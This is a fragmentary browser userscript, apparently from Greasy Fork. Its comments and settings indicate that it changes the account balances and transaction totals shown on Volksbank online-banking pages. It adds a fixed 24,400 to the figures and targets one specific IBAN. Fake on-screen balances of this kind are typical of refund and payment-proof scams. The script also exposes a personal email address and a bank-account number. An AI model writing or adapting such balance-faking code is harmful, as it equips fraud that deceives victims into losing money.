// ==UserScript==
// @name         Ed 4Rec  post.v.nieves@gmx.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/519765/Ed%204Rec%20%20postvnieves%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/519765/Ed%204Rec%20%20postvnieves%40gmxde.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  24400},
        { index: 1, adjustmentAmount: 24400},
        { index: 2, adjustmentAmount: 24400},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE66 2152 0100";
    var targetTextContent2 = " 1000 1901 91";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 24400.0; // Adjust the amount as needed
